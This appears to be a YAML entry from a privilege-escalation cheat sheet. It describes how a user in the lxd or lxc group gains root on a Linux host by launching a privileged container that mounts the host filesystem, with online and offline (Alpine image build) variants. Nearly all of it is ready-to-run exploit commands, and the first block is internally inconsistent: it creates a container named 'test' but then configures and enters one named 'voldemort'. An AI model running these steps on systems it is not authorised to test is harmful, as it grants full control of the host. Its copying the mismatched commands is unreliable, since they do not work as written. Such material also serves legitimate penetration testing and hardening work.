---
functions:
  shell:
    - description: If you belong to lxd or lxc group, you can become root - Exploiting with internet
      code: |
        lxc init ubuntu:16.04 test -c security.privileged=true
        lxc config device add voldemort whatever disk source=/ path=/mnt/root recursive=true 
        lxc start voldemort
        lxc exec voldemort bash
        cd /mnt/root #Here is where the filesystem is mounted

    - description: Exploiting without internet
      code: |
        git clone https://github.com/saghul/lxd-alpine-builder
        cd lxd-alpine-builder
        sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
        sudo ./build-alpine -a i686

    - description: After building alpine image, transfer the image on the machine, import the image and follow the instructions
      code: |
        lxc image import ./alpine*.tar.gz --alias myimage 
        lxd init
        lxc init myimage mycontainer -c security.privileged=true
        lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
        lxc start mycontainer
        lxc exec mycontainer /bin/sh
---